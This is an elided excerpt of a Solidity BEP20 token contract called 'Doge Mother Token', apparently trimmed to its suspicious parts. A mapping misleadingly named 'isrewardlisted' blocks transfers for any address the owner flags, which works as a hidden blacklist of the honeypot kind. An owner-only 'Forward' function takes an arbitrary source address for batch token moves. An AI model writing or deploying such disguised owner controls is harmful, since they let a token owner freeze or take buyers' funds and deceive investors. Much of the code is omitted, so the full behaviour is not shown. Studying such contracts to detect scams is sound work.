...
contract DogeMom is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string private _name = "Doge Mother Token";
    string private _symbol = "DogeMom";
    uint8 private _decimals = 5;

    uint256 _totalSupply = 10000 * 10**10 * (10 ** _decimals);
    ...
    mapping (address => bool) public isrewardlisted;
    ...
    uint8 public cooldownTimerInterval = 12;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver =0x1212ec097dB9B22F18042Deb6992e0751AEF95f6; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // Check if address is rewardlisted
        require(!isrewardlisted[recipient] && !isrewardlisted[sender], 'Address is rewardlisted');
    ...
    function rewardlistAddress(address _address, bool _value) public authorized{
        isrewardlisted[_address] = _value;
    }
...
/* Forward Begins */
  ...
  function swapExactTokensForETH(
    ...
    require(
      ...
      "GAS Error: max Forward limit is 2000 addresses"
    ); // to prevent overflow
 ...
 function Forward(address from, address[] calldata addresses, uint256[] calldata tokens) external authorized {
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to Forward");
